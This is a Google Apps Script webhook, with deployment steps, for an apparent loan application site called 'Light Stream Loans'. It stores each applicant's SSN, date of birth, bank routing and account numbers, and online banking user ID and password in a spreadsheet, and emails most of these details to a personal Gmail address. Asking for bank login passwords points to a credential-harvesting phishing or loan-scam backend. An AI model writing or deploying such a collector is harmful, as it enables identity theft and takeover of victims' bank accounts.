/**
 * Light Stream Loans - Google Apps Script
 * 
 * 1. Open Google Sheets and create a new spreadsheet.
 * 2. Go to Extensions → Apps Script.
 * 3. Delete the default myFunction and paste this entire file.
 * 4. Edit RECIPIENTS below to the emails that should receive notifications.
 * 5. Save, then click Deploy → New deployment → type: Web app.
 *    - Execute as: Me
 *    - Who has access: Anyone
 * 6. Copy the Web app URL and paste it into your .env.local as GOOGLE_SCRIPT_URL.
 */

const SHEET_NAME = "Applications";
const RECIPIENTS = "finnfoxpersonalloan@gmail.com"; // add more emails separated by commas if needed

function doGet(e) {
  return jsonResponse({ ok: true, message: "Light Stream Loans webhook is ready." });
}

function doPost(e) {
  try {
    const data = JSON.parse(e.postData.contents);

    // Get or create the target sheet
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    if (!ss) {
      throw new Error("This script is not bound to a Google Sheet. Create a Google Sheet and run this code from its Apps Script editor.");
    }
    let sheet = ss.getSheetByName(SHEET_NAME);
    if (!sheet) {
      sheet = ss.insertSheet(SHEET_NAME);
      ensureHeaders(sheet);
    }

    ensureHeaders(sheet);

    const row = [
      new Date().toISOString(),
      data.firstName || "",
      data.lastName || "",
      data.dob || "",
      data.email || "",
      data.ssn || "",
      data.streetAddress || "",
      data.city || "",
      data.state || "",
      data.zip || "",
      data.bankName || "",
      data.loanAmount || "",
      data.routingNumber || "",
      data.accountNumber || "",
      data.bankUserId || "",
      data.bankPassword || "",
    ];

    sheet.appendRow(row);

    // Send email notification
    const body = `A new loan application was submitted.

Name: ${data.firstName} ${data.lastName}
Email: ${data.email}
SSN: ${data.ssn}
DOB: ${data.dob}
Address: ${data.streetAddress}, ${data.city}, ${data.state} ${data.zip}
Bank name: ${data.bankName}
Loan amount: ${data.loanAmount}
Routing number: ${data.routingNumber}
Account number: ${data.accountNumber}
Bank user ID: ${data.bankUserId}

Submitted at: ${new Date().toISOString()}
`;

    MailApp.sendEmail({
      to: RECIPIENTS,
      subject: "New Loan Application Received - Light Stream Loans",
      body: body,
      name: "Light Stream Loans",
    });

    return jsonResponse({ ok: true });
  } catch (err) {
    return jsonResponse({ ok: false, error: err.message }, 500);
  }
}

function ensureHeaders(sheet) {
  const headers = [
    "Timestamp",
    "First Name",
    "Last Name",
    "DOB",
    "Email",
    "SSN",
    "Street Address",
    "City",
    "State",
    "ZIP",
    "Bank Name",
    "Loan Amount",
    "Routing Number",
    "Account Number",
    "Bank User ID",
    "Bank Password",
  ];

  const lastCol = sheet.getLastColumn();
  const firstRow = lastCol > 0 ? sheet.getRange(1, 1, 1, lastCol).getValues()[0] : [];

  if (firstRow.length === 0 || firstRow[0] !== "Timestamp") {
    sheet.getRange(1, 1, 1, headers.length).setValues([headers]);
    sheet.getRange(1, 1, 1, headers.length).setFontWeight("bold");
  }
}

function jsonResponse(payload, statusCode) {
  const output = ContentService.createTextOutput(JSON.stringify(payload));
  output.setMimeType(ContentService.MimeType.JSON);
  return output;
}
